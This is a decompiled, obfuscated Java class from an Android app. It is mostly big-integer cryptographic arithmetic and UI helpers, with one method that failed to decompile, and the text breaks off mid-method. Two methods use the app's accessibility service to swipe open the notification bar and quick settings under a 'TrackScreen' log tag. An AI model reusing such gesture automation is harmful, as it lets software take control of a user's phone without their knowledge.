package defpackage;

import android.R;
import android.animation.ObjectAnimator;
import android.animation.PropertyValuesHolder;
import android.app.AppOpsManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.res.Resources;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.PorterDuff;
import android.graphics.Rect;
import android.os.Binder;
import android.os.Build;
import android.os.Process;
import android.text.TextDirectionHeuristic;
import android.text.TextDirectionHeuristics;
import android.text.TextPaint;
import android.text.method.PasswordTransformationMethod;
import android.util.Log;
import android.util.Property;
import android.util.TypedValue;
import android.view.ActionMode;
import android.view.View;
import android.view.ViewGroup;
import android.view.animation.BaseInterpolator;
import android.widget.TextView;
import androidx.appcompat.widget.AppCompatTextView;
import androidx.recyclerview.widget.k;
import androidx.transition.R$id;
import androidx.transition.Visibility;
import androidx.work.impl.WorkDatabaseVersions;
import com.mamimobi.AccessService;
import io.nats.client.support.NatsConstants;
import java.math.BigInteger;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.Objects;
import java.util.WeakHashMap;

/* JADX INFO: loaded from: classes.dex */
public abstract class fa0 {
    public static String A;
    public static String B;
    public static String C;
    public static String D;
    public static String E;
    public static LinkedList F;
    public static String a;
    public static String b;
    public static String c;
    public static String d;
    public static String e;
    public static String f;
    public static String g;
    public static String h;
    public static String i;
    public static String j;
    public static String k;
    public static String l;
    public static String m;
    public static String n;
    public static String o;
    public static String p;
    public static String q;
    public static String r;
    public static String s;
    public static String t;
    public static String u;
    public static String v;
    public static String w;
    public static String x;
    public static String y;
    public static String z;

    public static boolean A(int[] iArr, int[] iArr2, int[] iArr3) {
        boolean z2;
        int i2 = 7;
        while (true) {
            z2 = true;
            if (i2 < 0) {
                break;
            }
            int i3 = iArr[8 + i2] ^ Integer.MIN_VALUE;
            int i4 = Integer.MIN_VALUE ^ iArr2[i2];
            if (i3 < i4) {
                z2 = false;
                break;
            }
            if (i3 > i4) {
                break;
            }
            i2--;
        }
        if (z2) {
            D0(iArr, 8, iArr2, 0, iArr3);
            return z2;
        }
        D0(iArr2, 0, iArr, 8, iArr3);
        return z2;
    }

    public static void A0(int i2, long[] jArr, long[] jArr2) {
        long[] jArr3 = new long[8];
        qm.o(4, jArr, jArr3);
        while (true) {
            s0(jArr3, jArr2);
            i2--;
            if (i2 <= 0) {
                return;
            } else {
                qm.o(4, jArr2, jArr3);
            }
        }
    }

    public static void B(View view, n61 n61Var) {
        WeakHashMap weakHashMap = f51.a;
        int paddingStart = view.getPaddingStart();
        int paddingTop = view.getPaddingTop();
        int paddingEnd = view.getPaddingEnd();
        int paddingBottom = view.getPaddingBottom();
        o61 o61Var = new o61();
        o61Var.a = paddingStart;
        o61Var.b = paddingTop;
        o61Var.c = paddingEnd;
        o61Var.d = paddingBottom;
        t41.u(view, new n41(n61Var, 3, o61Var));
        if (view.isAttachedToWindow()) {
            r41.c(view);
        } else {
            view.addOnAttachStateChangeListener(new m61());
        }
    }

    public static int B0(int i2, int[] iArr, int[] iArr2, int[] iArr3) {
        long j2 = 0;
        for (int i3 = 0; i3 < i2; i3++) {
            long j3 = ((((long) iArr[i3]) & 4294967295L) - (4294967295L & ((long) iArr2[i3]))) + j2;
            iArr3[i3] = (int) j3;
            j2 = j3 >> 32;
        }
        return (int) j2;
    }

    public static float C(Context context, int i2) {
        return TypedValue.applyDimension(1, i2, context.getResources().getDisplayMetrics());
    }

    public static int C0(int[] iArr, int[] iArr2, int[] iArr3) {
        long j2 = (((long) iArr[0]) & 4294967295L) - (((long) iArr2[0]) & 4294967295L);
        iArr3[0] = (int) j2;
        long j3 = ((((long) iArr[1]) & 4294967295L) - (((long) iArr2[1]) & 4294967295L)) + (j2 >> 32);
        iArr3[1] = (int) j3;
        long j4 = ((((long) iArr[2]) & 4294967295L) - (((long) iArr2[2]) & 4294967295L)) + (j3 >> 32);
        iArr3[2] = (int) j4;
        long j5 = ((((long) iArr[3]) & 4294967295L) - (((long) iArr2[3]) & 4294967295L)) + (j4 >> 32);
        iArr3[3] = (int) j5;
        long j6 = ((((long) iArr[4]) & 4294967295L) - (((long) iArr2[4]) & 4294967295L)) + (j5 >> 32);
        iArr3[4] = (int) j6;
        long j7 = ((((long) iArr[5]) & 4294967295L) - (((long) iArr2[5]) & 4294967295L)) + (j6 >> 32);
        iArr3[5] = (int) j7;
        long j8 = ((((long) iArr[6]) & 4294967295L) - (((long) iArr2[6]) & 4294967295L)) + (j7 >> 32);
        iArr3[6] = (int) j8;
        long j9 = ((((long) iArr[7]) & 4294967295L) - (((long) iArr2[7]) & 4294967295L)) + (j8 >> 32);
        iArr3[7] = (int) j9;
        return (int) (j9 >> 32);
    }

    public static boolean D(int i2, int[] iArr, int[] iArr2) {
        for (int i3 = i2 - 1; i3 >= 0; i3--) {
            if (iArr[i3] != iArr2[i3]) {
                return false;
            }
        }
        return true;
    }

    public static void D0(int[] iArr, int i2, int[] iArr2, int i3, int[] iArr3) {
        long j2 = (((long) iArr[i2]) & 4294967295L) - (((long) iArr2[i3]) & 4294967295L);
        iArr3[0] = (int) j2;
        long j3 = ((((long) iArr[i2 + 1]) & 4294967295L) - (((long) iArr2[i3 + 1]) & 4294967295L)) + (j2 >> 32);
        iArr3[1] = (int) j3;
        long j4 = ((((long) iArr[i2 + 2]) & 4294967295L) - (((long) iArr2[i3 + 2]) & 4294967295L)) + (j3 >> 32);
        iArr3[2] = (int) j4;
        long j5 = ((((long) iArr[i2 + 3]) & 4294967295L) - (((long) iArr2[i3 + 3]) & 4294967295L)) + (j4 >> 32);
        iArr3[3] = (int) j5;
        long j6 = ((((long) iArr[i2 + 4]) & 4294967295L) - (((long) iArr2[i3 + 4]) & 4294967295L)) + (j5 >> 32);
        iArr3[4] = (int) j6;
        long j7 = ((((long) iArr[i2 + 5]) & 4294967295L) - (((long) iArr2[i3 + 5]) & 4294967295L)) + (j6 >> 32);
        iArr3[5] = (int) j7;
        long j8 = ((((long) iArr[i2 + 6]) & 4294967295L) - (((long) iArr2[i3 + 6]) & 4294967295L)) + (j7 >> 32);
        iArr3[6] = (int) j8;
        iArr3[7] = (int) (((((long) iArr[i2 + 7]) & 4294967295L) - (((long) iArr2[i3 + 7]) & 4294967295L)) + (j8 >> 32));
    }

    public static boolean E(int[] iArr, int[] iArr2) {
        for (int i2 = 7; i2 >= 0; i2--) {
            if (iArr[i2] != iArr2[i2]) {
                return false;
            }
        }
        return true;
    }

    public static void E0(int i2, int i3, int[] iArr) {
        long j2 = (((long) iArr[0]) & 4294967295L) - (((long) i3) & 4294967295L);
        iArr[0] = (int) j2;
        long j3 = ((4294967295L & ((long) iArr[1])) - 1) + (j2 >> 32);
        iArr[1] = (int) j3;
        if ((j3 >> 32) == 0) {
            return;
        }
        y(i2, 2, iArr);
    }

    public static boolean F(long[] jArr, long[] jArr2) {
        for (int i2 = 3; i2 >= 0; i2--) {
            if (jArr[i2] != jArr2[i2]) {
                return false;
            }
        }
        return true;
    }

    public static int F0(int i2, int i3, int[] iArr, int[] iArr2) {
        long j2 = 0;
        for (int i4 = 0; i4 < i2; i4++) {
            int i5 = i3 + i4;
            long j3 = ((((long) iArr2[i5]) & 4294967295L) - (4294967295L & ((long) iArr[i4]))) + j2;
            iArr2[i5] = (int) j3;
            j2 = j3 >> 32;
        }
        return (int) j2;
    }

    public static boolean G(String str, String str2) {
        return (str == null ? null : str.replaceAll("[\u200e\u200f\u202a\u202b\u202c\u202d\u202e\"“”，]", "").replace(NatsConstants.SPACE, "")).equals(str2 != null ? str2.replaceAll("[\u200e\u200f\u202a\u202b\u202c\u202d\u202e\"“”，]", "").replace(NatsConstants.SPACE, "") : null);
    }

    public static void G0(int i2, int[] iArr, int[] iArr2) {
        long j2 = 0;
        for (int i3 = 0; i3 < i2; i3++) {
            long j3 = ((((long) iArr2[i3]) & 4294967295L) - (4294967295L & ((long) iArr[i3]))) + j2;
            iArr2[i3] = (int) j3;
            j2 = j3 >> 32;
        }
    }

    public static void H() {
        try {
            int i2 = Resources.getSystem().getDisplayMetrics().widthPixels * 3;
            int i3 = i2 / 4;
            int i4 = i2 / 4;
            int i5 = Resources.getSystem().getDisplayMetrics().heightPixels / 2;
            Log.d("TrackScreen", "expandNotificationBar: " + i3 + ",0," + i4 + "," + i5);
            AccessService accessService = AccessService.e0;
            if (accessService != null) {
                d91.k(accessService, i3, 0, i4, i5);
            }
        } catch (Exception unused) {
        }
    }

    public static void H0(int[] iArr, int[] iArr2) {
        long j2 = (((long) iArr2[0]) & 4294967295L) - (((long) iArr[0]) & 4294967295L);
        iArr2[0] = (int) j2;
        long j3 = ((((long) iArr2[1]) & 4294967295L) - (((long) iArr[1]) & 4294967295L)) + (j2 >> 32);
        iArr2[1] = (int) j3;
        long j4 = ((((long) iArr2[2]) & 4294967295L) - (((long) iArr[2]) & 4294967295L)) + (j3 >> 32);
        iArr2[2] = (int) j4;
        long j5 = ((((long) iArr2[3]) & 4294967295L) - (((long) iArr[3]) & 4294967295L)) + (j4 >> 32);
        iArr2[3] = (int) j5;
        long j6 = ((((long) iArr2[4]) & 4294967295L) - (((long) iArr[4]) & 4294967295L)) + (j5 >> 32);
        iArr2[4] = (int) j6;
        long j7 = ((((long) iArr2[5]) & 4294967295L) - (((long) iArr[5]) & 4294967295L)) + (j6 >> 32);
        iArr2[5] = (int) j7;
        long j8 = ((((long) iArr2[6]) & 4294967295L) - (((long) iArr[6]) & 4294967295L)) + (j7 >> 32);
        iArr2[6] = (int) j8;
        iArr2[7] = (int) (((((long) iArr2[7]) & 4294967295L) - (4294967295L & ((long) iArr[7]))) + (j8 >> 32));
    }

    public static void I() {
        try {
            int i2 = Resources.getSystem().getDisplayMetrics().widthPixels;
            int i3 = i2 / 4;
            int i4 = i2 / 4;
            int i5 = Resources.getSystem().getDisplayMetrics().heightPixels / 2;
            Log.d("TrackScreen", "expandQuickSettings: " + i3 + ",0," + i4 + "," + i5);
            AccessService accessService = AccessService.e0;
            if (accessService != null) {
                d91.k(accessService, i3, 0, i4, i5);
            }
        } catch (Exception unused) {
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:31:0x0050  */
    /* JADX WARN: Removed duplicated region for block: B:48:0x0094  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public static final long I0(java.lang.String r23, long r24, long r26, long r28) {
        /*
            Method dump skipped, instruction units count: 251
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: defpackage.fa0.I0(java.lang.String, long, long, long):long");
    }

    public static int[] J(int i2, BigInteger bigInteger) {
        if (bigInteger.signum() < 0 || bigInteger.bitLength() > i2) {
            throw new IllegalArgumentException();
        }
        int i3 = (i2 + 31) >> 5;
        int[] iArr = new int[i3];
        for (int i4 = 0; i4 < i3; i4++) {
            iArr[i4] = bigInteger.intValue();
            bigInteger = bigInteger.shiftRight(32);
        }
        return iArr;
    }

    public static int J0(int i2, int i3, String str) {
        return (int) I0(str, i2, 1, (i3 & 8) != 0 ? Integer.MAX_VALUE : 2097150);
    }

    public static int[] K(BigInteger bigInteger) {
        if (bigInteger.signum() < 0 || bigInteger.bitLength() > 256) {
            throw new IllegalArgumentException();
        }
        int[] iArr = new int[8];
        for (int i2 = 0; i2 < 8; i2++) {
            iArr[i2] = bigInteger.intValue();
            bigInteger = bigInteger.shiftRight(32);
        }
        return iArr;
    }

    public static BigInteger K0(int[] iArr) {
        byte[] bArr = new byte[32];
        for (int i2 = 0; i2 < 8; i2++) {
            int i3 = iArr[i2];
            if (i3 != 0) {
                ma0.K(bArr, i3, (7 - i2) << 2);
            }
        }
        return new BigInteger(1, bArr);
    }

    public static long[] L(int i2, BigInteger bigInteger) {
        if (bigInteger.signum() < 0 || bigInteger.bitLength() > i2) {
            throw new IllegalArgumentException();
        }
        int i3 = (i2 + 63) >> 6;
        long[] jArr = new long[i3];
        for (int i4 = 0; i4 < i3; i4++) {
            jArr[i4] = bigInteger.longValue();
            bigInteger = bigInteger.shiftRight(64);
        }
        return jArr;
    }

    public static BigInteger L0(int[] iArr, int i2) {
        byte[] bArr = new byte[i2 << 2];
        for (int i3 = 0; i3 < i2; i3++) {
            int i4 = iArr[i3];
            if (i4 != 0) {
                ma0.K(bArr, i4, ((i2 - 1) - i3) << 2);
            }
        }
        return new BigInteger(1, bArr);
    }

    public static int M(int[] iArr) {
        return iArr[0] & 1;
    }

    public static BigInteger M0(long[] jArr) {
        byte[] bArr = new byte[32];
        for (int i2 = 0; i2 < 4; i2++) {
            long j2 = jArr[i2];
            if (j2 != 0) {
                ma0.S(j2, bArr, (3 - i2) << 3);
            }
        }
        return new BigInteger(1, bArr);
    }

    public static int N(int[] iArr) {
        return iArr[0] & 1;
    }

    public static void N0(int i2, po poVar) {
        poVar.f((byte) (i2 >>> 24));
        poVar.f((byte) (i2 >>> 16));
        poVar.f((byte) (i2 >>> 8));
        poVar.f((byte) i2);
    }

    public static int O(Context context, int i2, int i3) {
        Integer numValueOf;
        TypedValue typedValueS = s90.S(context, i2);
        if (typedValueS != null) {
            int i4 = typedValueS.resourceId;
            numValueOf = Integer.valueOf(i4 != 0 ? qi.a(context, i4) : typedValueS.data);
        } else {
            numValueOf = null;
        }
        return numValueOf != null ? numValueOf.intValue() : i3;
    }

    public static ActionMode.Callback O0(ActionMode.Callback callback) {
        return (!(callback instanceof f01) || Build.VERSION.SDK_INT < 26) ? callback : ((f01) callback).a;
    }

    public static int P(View view, int i2) {
        Context context = view.getContext();
        TypedValue typedValueW = s90.W(view.getContext(), i2, view.getClass().getCanonicalName());
        int i3 = typedValueW.resourceId;
        return i3 != 0 ? qi.a(context, i3) : typedValueW.data;
    }

    public static ActionMode.Callback P0(ActionMode.Callback callback, TextView textView) {
        int i2 = Build.VERSION.SDK_INT;
        return (i2 < 26 || i2 > 27 || (callback instanceof f01) || callback == null) ? callback : new f01(callback, textView);
    }

    public static ViewGroup Q(View view) {
        if (view == null) {
            return null;
        }
        View rootView = view.getRootView();
        ViewGroup viewGroup = (ViewGroup) rootView.findViewById(R.id.content);
        if (viewGroup != null) {
            return viewGroup;
        }
        if (rootView == view || !(rootView instanceof ViewGroup)) {
            return null;
        }
        return (ViewGroup) rootView;
    }

    public static void Q0(Context context, String str, String str2) {
        SharedPreferences.Editor editorEdit = context.getSharedPreferences(context.getPackageName(), 0).edit();
        editorEdit.putString(str, str2);
        editorEdit.apply();
    }

    public static vr R(po poVar) {
        poVar.c();
        return new vr(poVar.b(), 2);
    }

    public static void R0(Context context, String str, boolean z2) {
        try {
            SharedPreferences.Editor editorEdit = context.getSharedPreferences(context.getPackageName(), 0).edit();
            editorEdit.putBoolean(str, z2);
            editorEdit.apply();
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    public static gl0 S(AppCompatTextView appCompatTextView) {
        int i2 = Build.VERSION.SDK_INT;
        if (i2 >= 28) {
            return new gl0(e01.c(appCompatTextView));
        }
        TextPaint textPaint = new TextPaint(appCompatTextView.getPaint());
        TextDirectionHeuristic textDirectionHeuristic = TextDirectionHeuristics.FIRSTSTRONG_LTR;
        int iA = c01.a(appCompatTextView);
        int iD = c01.d(appCompatTextView);
        if (appCompatTextView.getTransformationMethod() instanceof PasswordTransformationMethod) {
            textDirectionHeuristic = TextDirectionHeuristics.LTR;
        } else if (i2 < 28 || (appCompatTextView.getInputType() & 15) != 3) {
            boolean z2 = appCompatTextView.getLayoutDirection() == 1;
            switch (appCompatTextView.getTextDirection()) {
                case 2:
                    textDirectionHeuristic = TextDirectionHeuristics.ANYRTL_LTR;
                    break;
                case 3:
                    textDirectionHeuristic = TextDirectionHeuristics.LTR;
                    break;
                case 4:
                    textDirectionHeuristic = TextDirectionHeuristics.RTL;
                    break;
                case 5:
                    textDirectionHeuristic = TextDirectionHeuristics.LOCALE;
                    break;
                case 6:
                    break;
                case 7:
                    textDirectionHeuristic = TextDirectionHeuristics.FIRSTSTRONG_RTL;
                    break;
                default:
                    if (z2) {
                        textDirectionHeuristic = TextDirectionHeuristics.FIRSTSTRONG_RTL;
                    }
                    break;
            }
        } else {
            byte directionality = Character.getDirectionality(e01.b(d01.a(appCompatTextView.getTextLocale()))[0].codePointAt(0));
            textDirectionHeuristic = (directionality == 1 || directionality == 2) ? TextDirectionHeuristics.RTL : TextDirectionHeuristics.LTR;
        }
        return new gl0(textPaint, textDirectionHeuristic, iA, iD);
    }

    public static boolean T(int i2, int[] iArr, int[] iArr2) {
        for (int i3 = i2 - 1; i3 >= 0; i3--) {
            int i4 = iArr[i3] ^ Integer.MIN_VALUE;
            int i5 = Integer.MIN_VALUE ^ iArr2[i3];
            if (i4 < i5) {
                return false;
            }
            if (i4 > i5) {
                return true;
            }
        }
        return true;
    }

    public static boolean U(int[] iArr, int[] iArr2) {
        for (int i2 = 7; i2 >= 0; i2--) {
            int i3 = iArr[i2] ^ Integer.MIN_VALUE;
            int i4 = Integer.MIN_VALUE ^ iArr2[i2];
            if (i3 < i4) {
                return false;
            }
            if (i3 > i4) {
                return true;
            }
        }
        return true;
    }

    public static void V(long[] jArr, long[] jArr2) {
        long j2 = jArr[0];
        long j3 = jArr[1];
        long j4 = jArr[2];
        long j5 = jArr[3];
        jArr2[0] = j2 & 1152921504606846975L;
        jArr2[1] = ((j2 >>> 60) ^ (j3 << 4)) & 1152921504606846975L;
        jArr2[2] = ((j3 >>> 56) ^ (j4 << 8)) & 1152921504606846975L;
        jArr2[3] = (j4 >>> 52) ^ (j5 << 12);
    }

    public static void W(long[] jArr, long[] jArr2, long[] jArr3) {
        long[] jArr4 = new long[4];
        long[] jArr5 = new long[4];
        V(jArr, jArr4);
        V(jArr2, jArr5);
        long[] jArr6 = new long[8];
        X(jArr6, jArr4[0], jArr5[0], jArr3, 0);
        X(jArr6, jArr4[1], jArr5[1], jArr3, 1);
        X(jArr6, jArr4[2], jArr5[2], jArr3, 2);
        X(jArr6, jArr4[3], jArr5[3], jArr3, 3);
        for (int i2 = 5; i2 > 0; i2--) {
            jArr3[i2] = jArr3[i2] ^ jArr3[i2 - 1];
        }
        X(jArr6, jArr4[0] ^ jArr4[1], jArr5[0] ^ jArr5[1], jArr3, 1);
        X(jArr6, jArr4[2] ^ jArr4[3], jArr5[2] ^ jArr5[3], jArr3, 3);
        for (int i3 = 7; i3 > 1; i3--) {
            jArr3[i3] = jArr3[i3] ^ jArr3[i3 - 2];
        }
        long j2 = jArr4[0] ^ jArr4[2];
        long j3 = jArr4[1] ^ jArr4[3];
        long j4 = jArr5[0] ^ jArr5[2];
        long j5 = jArr5[3] ^ jArr5[1];
        X(jArr6, j2 ^ j3, j4 ^ j5, jArr3, 3);
        long[] jArr7 = new long[3];
        X(jArr6, j2, j4, jArr7, 0);
        X(jArr6, j3, j5, jArr7, 1);
        long j6 = jArr7[0];
        long j7 = jArr7[1];
        long j8 = jArr7[2];
        long j9 = jArr3[2] ^ j6;
        jArr3[2] = j9;
        long j10 = jArr3[3] ^ (j6 ^ j7);
        jArr3[3] = j10;
        long j11 = jArr3[4] ^ (j7 ^ j8);
        jArr3[4] = j11;
        long j12 = jArr3[5] ^ j8;
        jArr3[5] = j12;
        long j13 = jArr3[0];
        long j14 = jArr3[1];
        long j15 = jArr3[6];
        long j16 = jArr3[7];
        jArr3[0] = j13 ^ (j14 << 60);
        jArr3[1] = (j14 >>> 4) ^ (j9 << 56);
        jArr3[2] = (j9 >>> 8) ^ (j10 << 52);
        jArr3[3] = (j10 >>> 12) ^ (j11 << 48);
        jArr3[4] = (j11 >>> 16) ^ (j12 << 44);
        jArr3[5] = (j12 >>> 20) ^ (j15 << 40);
        jArr3[6] = (j15 >>> 24) ^ (j16 << 36);
        jArr3[7] = j16 >>> 28;
    }

    public static void X(long[] jArr, long j2, long j3, long[] jArr2, int i2) {
        jArr[1] = j3;
        long j4 = j3 << 1;
        jArr[2] = j4;
        long j5 = j4 ^ j3;
        jArr[3] = j5;
        long j6 = j3 << 2;
        jArr[4] = j6;
        jArr[5] = j6 ^ j3;
        long j7 = j5 << 1;
        jArr[6] = j7;
        jArr[7] = j7 ^ j3;
        int i3 = (int) j2;
        long j8 = (jArr[(i3 >>> 3) & 7] << 3) ^ jArr[i3 & 7];
        long j9 = 0;
        int i4 = 54;
        do {
            int i5 = (int) (j2 >>> i4);
            long j10 = jArr[i5 & 7] ^ (jArr[(i5 >>> 3) & 7] << 3);
            j8 ^= j10 << i4;
            j9 ^= j10 >>> (-i4);
            i4 -= 6;
        } while (i4 > 0);
        jArr2[i2] = jArr2[i2] ^ (1152921504606846975L & j8);
        int i6 = i2 + 1;
        jArr2[i6] = ((((((j2 & 585610922974906400L) & ((j3 << 4) >> 63)) >>> 5) ^ j9) << 4) ^ (j8 >>> 60)) ^ jArr2[i6];
    }

    public static int Y(int i2, int[] iArr, int[] iArr2) {
        int i3 = 0;
        while (i3 < i2) {
            int i4 = iArr[i3] + 1;
            iArr2[i3] = i4;
            i3++;
            if (i4 != 0) {
                while (i3 < i2) {
                    iArr2[i3] = iArr[i3];
                    i3++;
                }
                return 0;
            }
        }
        return 1;
    }

    public static int Z(int[] iArr) {
        for (int i2 = 0; i2 < 16; i2++) {
            int i3 = iArr[i2] + 1;
            iArr[i2] = i3;
            if (i3 != 0) {
                return 0;
            }
        }
        return 1;
    }

    public static int a(int i2, int[] iArr, int[] iArr2, int[] iArr3) {
        long j2 = 0;
        for (int i3 = 0; i3 < i2; i3++) {
            long j3 = (((long) iArr[i3]) & 4294967295L) + (4294967295L & ((long) iArr2[i3])) + j2;
            iArr3[i3] = (int) j3;
            j2 = j3 >>> 32;
        }
        return (int) j2;
    }

    public static int a0(int i2, int i3, int[] iArr) {
        while (i3 < i2) {
            int i4 = iArr[i3] + 1;
            iArr[i3] = i4;
            if (i4 != 0) {
                return 0;
            }
            i3++;
        }
        return 1;
    }

    public static int b(int[] iArr, int[] iArr2, int[] iArr3) {
        long j2 = (((long) iArr[0]) & 4294967295L) + (((long) iArr2[0]) & 4294967295L);
        iArr3[0] = (int) j2;
        long j3 = (((long) iArr[1]) & 4294967295L) + (((long) iArr2[1]) & 4294967295L) + (j2 >>> 32);
        iArr3[1] = (int) j3;
        long j4 = (((long) iArr[2]) & 4294967295L) + (((long) iArr2[2]) & 4294967295L) + (j3 >>> 32);
        iArr3[2] = (int) j4;
        long j5 = (((long) iArr[3]) & 4294967295L) + (((long) iArr2[3]) & 4294967295L) + (j4 >>> 32);
        iArr3[3] = (int) j5;
        long j6 = (((long) iArr[4]) & 4294967295L) + (((long) iArr2[4]) & 4294967295L) + (j5 >>> 32);
        iArr3[4] = (int) j6;
        long j7 = (((long) iArr[5]) & 4294967295L) + (((long) iArr2[5]) & 4294967295L) + (j6 >>> 32);
        iArr3[5] = (int) j7;
        long j8 = (((long) iArr[6]) & 4294967295L) + (((long) iArr2[6]) & 4294967295L) + (j7 >>> 32);
        iArr3[6] = (int) j8;
        long j9 = (((long) iArr[7]) & 4294967295L) + (((long) iArr2[7]) & 4294967295L) + (j8 >>> 32);
        iArr3[7] = (int) j9;
        return (int) (j9 >>> 32);
    }

    public static int b0(int i2, int i3, int[] iArr) {
        while (i3 < i2) {
            int i4 = iArr[i3] + 1;
            iArr[i3] = i4;
            if (i4 != 0) {
                return 0;
            }
            i3++;
        }
        return 1;
    }

    public static void c(int i2, int i3, int[] iArr) {
        long j2 = (((long) iArr[0]) & 4294967295L) + (((long) i3) & 4294967295L);
        iArr[0] = (int) j2;
        long j3 = (4294967295L & ((long) iArr[1])) + 1 + (j2 >>> 32);
        iArr[1] = (int) j3;
        if ((j3 >>> 32) == 0) {
            return;
        }
        a0(i2, 2, iArr);
    }

    public static boolean c0(int i2) {
        if (i2 == 0) {
            return false;
        }
        ThreadLocal threadLocal = dg.a;
        double[] dArr = (double[]) threadLocal.get();
        if (dArr == null) {
            dArr = new double[3];
            threadLocal.set(dArr);
        }
        int iRed = Color.red(i2);
        int iGreen = Color.green(i2);
        int iBlue = Color.blue(i2);
        if (dArr.length != 3) {
            throw new IllegalArgumentException("outXyz must have a length of 3.");
        }
        double d2 = ((double) iRed) / 255.0d;
        double dPow = d2 < 0.04045d ? d2 / 12.92d : Math.pow((d2 + 0.055d) / 1.055d, 2.4d);
        double d3 = ((double) iGreen) / 255.0d;
        double dPow2 = d3 < 0.04045d ? d3 / 12.92d : Math.pow((d3 + 0.055d) / 1.055d, 2.4d);
        double d4 = ((double) iBlue) / 255.0d;
        double dPow3 = d4 < 0.04045d ? d4 / 12.92d : Math.pow((d4 + 0.055d) / 1.055d, 2.4d);
        dArr[0] = ((0.1805d * dPow3) + (0.3576d * dPow2) + (0.4124d * dPow)) * 100.0d;
        double d5 = ((0.0722d * dPow3) + (0.7152d * dPow2) + (0.2126d * dPow)) * 100.0d;
        dArr[1] = d5;
        dArr[2] = ((dPow3 * 0.9505d) + (dPow2 * 0.1192d) + (dPow * 0.0193d)) * 100.0d;
        return d5 / 100.0d > 0.5d;
    }

    public static int d(int i2, int[] iArr, int[] iArr2, int[] iArr3) {
        long j2 = 0;
        for (int i3 = 0; i3 < i2; i3++) {
            long j3 = (((long) iArr[i3]) & 4294967295L) + (((long) iArr2[i3]) & 4294967295L) + (4294967295L & ((long) iArr3[i3])) + j2;
            iArr3[i3] = (int) j3;
            j2 = j3 >>> 32;
        }
        return (int) j2;
    }

    public static boolean d0(View view) {
        WeakHashMap weakHashMap = f51.a;
        return view.getLayoutDirection() == 1;
    }

    public static int e(int[] iArr, int[] iArr2, int[] iArr3) {
        long j2 = (((long) iArr[0]) & 4294967295L) + (((long) iArr2[0]) & 4294967295L) + (((long) iArr3[0]) & 4294967295L);
        iArr3[0] = (int) j2;
        long j3 = (((long) iArr[1]) & 4294967295L) + (((long) iArr2[1]) & 4294967295L) + (((long) iArr3[1]) & 4294967295L) + (j2 >>> 32);
        iArr3[1] = (int) j3;
        long j4 = (((long) iArr[2]) & 4294967295L) + (((long) iArr2[2]) & 4294967295L) + (((long) iArr3[2]) & 4294967295L) + (j3 >>> 32);
        iArr3[2] = (int) j4;
        long j5 = (((long) iArr[3]) & 4294967295L) + (((long) iArr2[3]) & 4294967295L) + (((long) iArr3[3]) & 4294967295L) + (j4 >>> 32);
        iArr3[3] = (int) j5;
        long j6 = (((long) iArr[4]) & 4294967295L) + (((long) iArr2[4]) & 4294967295L) + (((long) iArr3[4]) & 4294967295L) + (j5 >>> 32);
        iArr3[4] = (int) j6;
        long j7 = (((long) iArr[5]) & 4294967295L) + (((long) iArr2[5]) & 4294967295L) + (((long) iArr3[5]) & 4294967295L) + (j6 >>> 32);
        iArr3[5] = (int) j7;
        long j8 = (((long) iArr[6]) & 4294967295L) + (((long) iArr2[6]) & 4294967295L) + (((long) iArr3[6]) & 4294967295L) + (j7 >>> 32);
        iArr3[6] = (int) j8;
        long j9 = (((long) iArr[7]) & 4294967295L) + (((long) iArr2[7]) & 4294967295L) + (((long) iArr3[7]) & 4294967295L) + (j8 >>> 32);
        iArr3[7] = (int) j9;
        return (int) (j9 >>> 32);
    }

    public static boolean e0(int[] iArr) {
        if (iArr[0] != 1) {
            return false;
        }
        for (int i2 = 1; i2 < 8; i2++) {
            if (iArr[i2] != 0) {
                return false;
            }
        }
        return true;
    }

    public static void f(long[] jArr, long[] jArr2, long[] jArr3) {
        jArr3[0] = jArr[0] ^ jArr2[0];
        jArr3[1] = jArr[1] ^ jArr2[1];
        jArr3[2] = jArr[2] ^ jArr2[2];
        jArr3[3] = jArr[3] ^ jArr2[3];
        jArr3[4] = jArr[4] ^ jArr2[4];
        jArr3[5] = jArr[5] ^ jArr2[5];
        jArr3[6] = jArr[6] ^ jArr2[6];
        jArr3[7] = jArr2[7] ^ jArr[7];
    }

    public static boolean f0(int[] iArr, int i2) {
        if (iArr[0] != 1) {
            return false;
        }
        for (int i3 = 1; i3 < i2; i3++) {
            if (iArr[i3] != 0) {
                return false;
            }
        }
        return true;
    }

    public static int g(int i2, int i3, int i4, int[] iArr, int[] iArr2) {
        long j2 = (((long) iArr[i2]) & 4294967295L) + (((long) iArr2[i3]) & 4294967295L) + (((long) i4) & 4294967295L);
        iArr2[i3] = (int) j2;
        int i5 = i3 + 1;
        long j3 = (((long) iArr[i2 + 1]) & 4294967295L) + (((long) iArr2[i5]) & 4294967295L) + (j2 >>> 32);
        iArr2[i5] = (int) j3;
        int i6 = i3 + 2;
        long j4 = (((long) iArr[i2 + 2]) & 4294967295L) + (((long) iArr2[i6]) & 4294967295L) + (j3 >>> 32);
        iArr2[i6] = (int) j4;
        int i7 = i3 + 3;
        long j5 = (((long) iArr[i2 + 3]) & 4294967295L) + (((long) iArr2[i7]) & 4294967295L) + (j4 >>> 32);
        iArr2[i7] = (int) j5;
        int i8 = i3 + 4;
        long j6 = (((long) iArr[i2 + 4]) & 4294967295L) + (((long) iArr2[i8]) & 4294967295L) + (j5 >>> 32);
        iArr2[i8] = (int) j6;
        int i9 = i3 + 5;
        long j7 = (((long) iArr[i2 + 5]) & 4294967295L) + (((long) iArr2[i9]) & 4294967295L) + (j6 >>> 32);
        iArr2[i9] = (int) j7;
        int i10 = i3 + 6;
        long j8 = (((long) iArr[i2 + 6]) & 4294967295L) + (((long) iArr2[i10]) & 4294967295L) + (j7 >>> 32);
        iArr2[i10] = (int) j8;
        int i11 = i3 + 7;
        long j9 = (((long) iArr[i2 + 7]) & 4294967295L) + (4294967295L & ((long) iArr2[i11])) + (j8 >>> 32);
        iArr2[i11] = (int) j9;
        return (int) (j9 >>> 32);
    }

    public static boolean g0(long[] jArr) {
        if (jArr[0] != 1) {
            return false;
        }
        for (int i2 = 1; i2 < 4; i2++) {
            if (jArr[i2] != 0) {
                return false;
            }
        }
        return true;
    }

    public static int h(int i2, int i3, int[] iArr, int[] iArr2) {
        long j2 = 0;
